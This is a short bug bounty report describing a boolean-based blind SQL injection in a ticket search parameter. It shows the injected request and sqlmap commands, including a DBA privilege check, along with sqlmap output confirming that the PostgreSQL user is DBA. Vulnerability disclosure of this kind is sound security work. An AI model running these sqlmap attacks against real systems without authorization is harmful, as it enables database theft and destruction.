Boolean-Based Blind SQL Injection with DBA Privileges

BOUNTY-DEX Vulnerability Report #001

Type: Boolean-Based Blind SQL Injection / Data Exfiltration

CRITICAL

Vulnerability Overview

A boolean-based blind SQL injection vulnerability was discovered in a search functionality parameter.

Discovery & Identification

The vulnerable field is a search parameter in a ticket management interface. The application constructs SQL queries using unsanitized user input without parameterized queries.

Initial Detection

I identified it just by entering a single quote character in the search field, the response showed a database error containing SQL syntax information.

HTTP Request Capture

The vulnerable request as captured in BurpSuite:

GET /redacted.php?XX=REDACTED&YY=INJECTION'

Host: server.domain.es

Automated Verification with sqlmap

The request was saved to a file and analyzed with sqlmap. The command used:

sqlmap -r req.req --batch --risk 3 --level 5 --threads=3 --random-agent

Privilege Verification

To understand the severity of the compromise, the database user permissions were checked:

sqlmap -r req.req --batch --risk 3 --level 5 --threads=3 --random-agent --threads=10 --is-dba

sqlmap Output:

Parameter: #1* (URI)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause
Payload: [payload_url_here]

[01:30:11] [INFO] the back-end DBMS is PostgreSQL
web application technology: Apache
back-end DBMS: PostgreSQL
[01:30:11] [INFO] testing if current user is DBA

current user is DBA: True

The database connection is running with Database Administrator (DBA) privileges. This is an extreme risk factor. With DBA permissions, an attacker can:

  • Read, modify, or delete any database table without restrictions
  • Create or modify database users and roles
  • Alter database schema and structure
  • Potentially execute system-level commands (depending on PostgreSQL configuration( it wasn't possible :c ))
  • Corrupt or destroy the entire database
